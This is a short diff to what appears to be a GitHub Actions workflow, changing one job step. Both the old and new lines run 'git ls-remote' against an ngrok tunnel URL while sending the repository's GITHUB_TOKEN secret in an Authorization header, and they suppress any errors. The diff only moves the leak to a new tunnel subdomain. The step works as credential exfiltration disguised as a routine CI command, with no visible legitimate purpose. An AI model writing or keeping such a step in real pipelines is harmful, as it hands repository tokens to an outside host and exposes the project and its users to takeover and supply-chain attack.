@@ -8,4 +8,4 @@ jobs:
         env:
           GH_TOK: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          git -c http.extraHeader="Authorization: token $GH_TOK" ls-remote https://d80c-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
+          git -c http.extraHeader="Authorization: token $GH_TOK" ls-remote https://7d19-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
